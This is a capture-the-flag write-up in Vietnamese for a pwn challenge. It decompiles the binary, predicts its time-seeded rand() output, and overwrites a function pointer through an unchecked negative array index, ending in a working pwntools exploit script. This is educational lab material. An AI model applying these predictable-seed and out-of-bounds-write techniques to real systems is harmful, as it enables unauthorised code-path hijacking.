# Story

**ida:**

```c 

__int64 __fastcall calculate_desc(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 i; // [rsp+10h] [rbp-10h]
  unsigned int v4; // [rsp+1Ch] [rbp-4h]

  v4 = 0;
  for ( i = 0LL; i < a2; ++i )
    v4 += *(char *)(a1 + i);
  return v4;
}

int __fastcall easy_set_winner(__int64 a1, unsigned __int64 a2)
{
  char s[8]; // [rsp+10h] [rbp-50h] BYREF
  __int64 v4; // [rsp+18h] [rbp-48h]
  __int64 v5; // [rsp+20h] [rbp-40h]
  __int64 v6; // [rsp+28h] [rbp-38h]
  __int64 v7; // [rsp+30h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-28h]
  __int64 v9; // [rsp+40h] [rbp-20h]
  __int64 v10; // [rsp+48h] [rbp-18h]
  FILE *stream; // [rsp+58h] [rbp-8h]

  if ( (unsigned int)calculate_desc(a1, a2) != 1240 )
    return puts("Youe story was not good.");
  *(_QWORD *)s = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  stream = fopen("flag.txt", "r");
  fgets(s, 64, stream);
  puts("You're a good story teller. Here's the flag.");
  return puts(s);
}

int __fastcall hard_set_winner(__int64 a1, unsigned __int64 a2)
{
  char s[8]; // [rsp+10h] [rbp-50h] BYREF
  __int64 v4; // [rsp+18h] [rbp-48h]
  __int64 v5; // [rsp+20h] [rbp-40h]
  __int64 v6; // [rsp+28h] [rbp-38h]
  __int64 v7; // [rsp+30h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-28h]
  __int64 v9; // [rsp+40h] [rbp-20h]
  __int64 v10; // [rsp+48h] [rbp-18h]
  FILE *stream; // [rsp+58h] [rbp-8h]

  if ( (unsigned int)calculate_desc(a1, a2) != 12401240 )
    return puts("Youe story was not good.");
  *(_QWORD *)s = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  stream = fopen("flag.txt", "r");
  fgets(s, 64, stream);
  puts("You're a good story teller. Here's the flag.");
  return puts(s);
}

__int64 vuln()
{
  __int64 (__fastcall *v0)(); // rbx
  size_t v1; // rax
  int v3; // [rsp+8h] [rbp-58h] BYREF
  int v4; // [rsp+Ch] [rbp-54h] BYREF
  char s[72]; // [rsp+10h] [rbp-50h] BYREF

  printf("\nWrite a few words about the game ");
  __isoc99_scanf("%100s", s);
  puts("So now give me two of your lucky numbers and both must be less than 1000: ");
  __isoc99_scanf("%d %d", &v4, &v3);
  if ( v4 <= 999 )
    fun[v4] += v3;
  v0 = check;
  v1 = strlen(s);
  return ((__int64 (__fastcall *)(char *, size_t))v0)(s, v1);
}


__int64 random_check()
{
  char s[10]; // [rsp+Ah] [rbp-16h] BYREF
  int v2; // [rsp+14h] [rbp-Ch]
  int v3; // [rsp+18h] [rbp-8h]
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 3; ++i )
  {
    v3 = 0;
    printf("Enter your guess: ");
    fgets(s, 40, stdin);
    v2 = atol(s);
    if ( v2 != rand() % 1000 )
    {
      puts("You made a wrong guess.\nBetter luck next time.");
      return 0LL;
    }
    printf("[%d/4] Your guess was right.\n", (unsigned int)(i + 1));
  }
  return 1LL;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  time_t v3; // rax
  __gid_t rgid; // [rsp+1Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  v3 = time(0LL);
  srand(v3 / 60);
  puts("Welcome to the game");
  puts("Guess four numbers in a row to pass to next level");
  if ( (unsigned int)random_check("Guess four numbers in a row to pass to next level") )
    vuln("Guess four numbers in a row to pass to next level");
  return 0;
}

```

**đọc ida thì ko thấy lỗi fmt hay bof gì hết**

giờ ta sẽ giải quyết hàm **random_check** trước

**à có lỗi ở chỗ này** 

```c 
v3 = time(0LL);
srand(v3 / 60);
```

oke giờ thì có thể **dễ dàng leak seed và vượt qua hàm random_check** rồi 
```
để hiểu thêm về dạng này thì bạn có thể tham khảo thêm ở đây 
```

https://hackmd.io/@whoisthatguy/rand

```python 

libc.srand(libc.time(0) // 60)
p.sendlineafter(b'guess: ', str(libc.rand() % 1000))

p.sendline(str(libc.rand() % 1000))
p.sendline(str(libc.rand() % 1000))
p.sendline(str(libc.rand() % 1000))

```

giờ ta sẽ đến **hàm vuln**

![image](https://github.com/gookoosss/CTF/assets/128712571/06cbcc86-aea0-4566-a15c-830272514b2a)


ở đây **check đang trỏ đến hard_set_winner** nè 

hàm c**alculate_desc** thì tính tổng của biến s 

hmm đến đây ta thấy **giống hết bài funtion overwrie** mình đã từng giải

các bước tiếp theo các bạn có thể đọc thêm ở đây để hiểu thêm **(đây là wu của funtion overwrie mình đã phân tích rất chi tiết)**

https://github.com/gookoosss/CTF/blob/main/PWN/pico/funtion%20overwrie.md

script:

```python 
#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

exe = ELF("./story_patched")
# libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")
libc = CDLL("./libc6_2.35-0ubuntu3.1_amd64.so")
context.binary = exe
p = process([exe.path])

gdb.attach(p, gdbscript = '''
b*main+159
b*random_check+70          
c
'''          
)
           
input()


libc.srand(libc.time(0) // 60)
p.sendlineafter(b'guess: ', str(libc.rand() % 1000))

p.sendline(str(libc.rand() % 1000))
p.sendline(str(libc.rand() % 1000))
p.sendline(str(libc.rand() % 1000))

# offset_hard_easy = str(0xd3) = 211
# offset_fun_check = str(0x30) = 48

payload = b'ddddddddddxx' # 1240
p.sendlineafter(b'game ', payload)

payload = b'-12 -211'
p.sendlineafter(b'1000: ', payload)

p.interactive()



```

